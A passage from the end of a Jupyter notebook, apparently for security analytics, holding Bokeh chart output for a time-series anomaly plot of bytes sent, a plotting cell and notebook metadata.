array\":{\"type\":\"bytes\",\"data\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p1292\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p1293\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p1288\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"score\"},\"line_color\":{\"type\":\"value\",\"value\":\"blue\"},\"fill_color\":{\"type\":\"value\",\"value\":\"blue\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"blue\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p1289\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"score\"},\"line_color\":{\"type\":\"value\",\"value\":\"blue\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"blue\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"blue\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p1290\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"score\"},\"line_color\":{\"type\":\"value\",\"value\":\"blue\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"blue\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"blue\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p1223\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"RangeTool\",\"id\":\"p1294\",\"attributes\":{\"x_range\":{\"id\":\"p1061\"},\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p1295\",\"attributes\":{\"syncable\":false,\"level\":\"overlay\",\"propagate_hover\":true,\"editable\":true,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":0.5,\"line_dash\":[2,2],\"fill_color\":\"navy\",\"fill_alpha\":0.2}}}}]}},\"toolbar_location\":null,\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p1235\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p1236\",\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p1237\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p1238\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p1239\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1240\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1241\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1242\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1243\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1244\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1245\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1246\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1247\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p1248\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p1280\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p1250\"}}},{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p1279\",\"attributes\":{\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\",\"align\":\"right\"}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p1277\",\"attributes\":{\"axis\":{\"id\":\"p1235\"}}}]}}]}}],\"callbacks\":{\"type\":\"map\"}}};\n  const render_items = [{\"docid\":\"81bb5df1-d958-4fdd-9b20-18c159047c9f\",\"roots\":{\"p1299\":\"f44c366d-0112-429f-8344-74f25b3860c5\"},\"root_ids\":[\"p1299\"]}];\n  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n  }\n  if (root.Bokeh !== undefined) {\n    embed_document(root);\n  } else {\n    let attempts = 0;\n    const timer = setInterval(function(root) {\n      if (root.Bokeh !== undefined) {\n        clearInterval(timer);\n        embed_document(root);\n      } else {\n        attempts++;\n        if (attempts > 100) {\n          clearInterval(timer);\n          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n        }\n      }\n    }, 10, root)\n  }\n})(window);",
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "p1299"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# plot the results retrieved from previous step.\n",
    "ts_decomp_df.mp_timeseries.plot(\n",
    "    y=\"TotalBytesSent\",\n",
    ");"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "# End of Session\n"
   ]
  }
 ],
 "metadata": {
  "hide_input": false,
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "vscode": {
   "interpreter": {
    "hash": "0f1a8e166ce5c1ec1911a36e4fdbd34b2f623e2a3442791008b8ac429a1d6070"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
